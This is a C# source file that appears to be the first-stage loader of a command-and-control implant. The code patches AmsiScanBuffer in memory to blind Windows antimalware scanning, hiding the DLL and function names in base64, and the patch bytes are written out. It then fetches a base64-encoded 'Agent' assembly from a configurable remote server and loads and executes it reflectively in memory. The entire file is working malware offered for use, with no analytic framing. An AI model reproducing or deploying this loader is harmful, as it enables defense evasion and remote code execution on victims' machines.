using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace Stage1
{
    public static class Stage
    {
        public static void Entry(string agentparams)
        {
#if DEBUG
            Console.WriteLine(agentparams);
#endif
            var tab = agentparams.Split(':');
            string protocol = tab[0];
            string server = tab[1];
            int port = int.Parse(tab[2]);



#if DEBUG
            Console.WriteLine("Creating request");
#endif

            HttpClient client = new HttpClient();
            client.Timeout = new TimeSpan(0, 0, 10);
            client.BaseAddress = new Uri($"{protocol}://{server}:{port}/wh/");
            client.DefaultRequestHeaders.Clear();



#if DEBUG
            Console.WriteLine("Before Patching");
#endif
            try
            {
                PatchAMSI();

#if DEBUG
                Console.WriteLine("Patched");
#endif
            }
            catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine("Cannot Patch AMSI");
#endif
            }

#if DEBUG
            if (Is64Bit)
                Console.WriteLine("x64");
            else
                Console.WriteLine("x86");
#endif
            string file = "Agent";
            if (!Is64Bit)
                file += "-x86";
            file += ".b64";

#if DEBUG
            Console.WriteLine(file);
#endif
            var b64 = client.GetStringAsync(file).Result;

            var asm = Convert.FromBase64String(b64);

            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;


                var assembly = System.Reflection.Assembly.Load(asm);
                assembly.EntryPoint.Invoke(null, new object[] { new string[] { agentparams } });

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        static string dec(string enc)
        {
            byte[] b = Convert.FromBase64String(enc);
            return Encoding.UTF8.GetString(b);
        }

        static void PatchAMSI()
        {

            var lib = LoadLibrary(dec("YW1zaS5kbGw="));
            var asb = GetProcAddress(lib, dec("QW1zaVNjYW5CdWZmZXI="));
            var patch = GetPatch;
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, asb, patch.Length);
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
        }

        static byte[] GetPatch
        {
            get
            {
                if (Is64Bit)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
           IntPtr hModule,
           string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
    }
}
